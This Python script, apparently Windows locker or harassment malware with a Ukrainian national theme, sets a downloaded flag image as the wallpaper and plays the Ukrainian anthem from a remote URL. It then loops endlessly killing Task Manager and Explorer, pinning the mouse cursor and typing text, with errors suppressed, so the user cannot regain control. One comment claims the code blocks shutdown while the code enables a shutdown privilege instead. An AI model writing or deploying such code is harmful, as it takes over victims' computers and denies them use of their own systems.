import time
import keyboard
import threading
import urllib3
import os
import win32security
import win32api
import win32con
import pyautogui
from ImageController import ImageController
from ProcessController import ProcessController
from WindowsController import WindowsController


def start():
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    image_url = "https://img.freepik.com/free-vector/ukrainian-flag-pattern-vector_53876-162417.jpg"
    music_url = "https://muz8.z3.fm/d/18/gimn_ukraini_-_shche_ne_vmerla_ukrani_(zf.fm).mp3?download=force"
    filename = 'icon.ico'
    image_path = os.path.join(os.getcwd(), "wallpaper.ico")

    current_pid = win32api.GetCurrentProcessId()
    hProcess = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, False, current_pid)

    # Получаем дескриптор токена процесса
    hToken = win32security.OpenProcessToken(hProcess, win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)

    # Запрещаем выключение компьютера через групповую политику
    SE_SHUTDOWN_NAME = 'SeShutdownPrivilege'
    shutdown_privilege = win32security.LookupPrivilegeValue(None, SE_SHUTDOWN_NAME)
    privileges = [(shutdown_privilege, win32security.SE_PRIVILEGE_ENABLED)]
    win32security.AdjustTokenPrivileges(hToken, False, privileges)

    if ImageController.download_image(image_url, image_path):
        ImageController.set_wallpaper(image_path)
        print("Обои успешно установлены!")
    else:
        print("Не удалось загрузить изображение.")

    music_thread = threading.Thread(target=ImageController.play_music, args=(music_url,))
    image_thread = threading.Thread(target=ImageController.show_image, args=(image_url,))
    restor = threading.Thread(target=WindowsController.restor_window)

    music_thread.start()
    image_thread.start()

    time.sleep(1)
    restor.start()

    while True:
        try:
            while True:
                ProcessController.kill_task_manager()
                ProcessController.kill_explorer_manager()
                pyautogui.moveTo(12, 34, )
                keyboard.write("Украинизация")
        except:
            ...
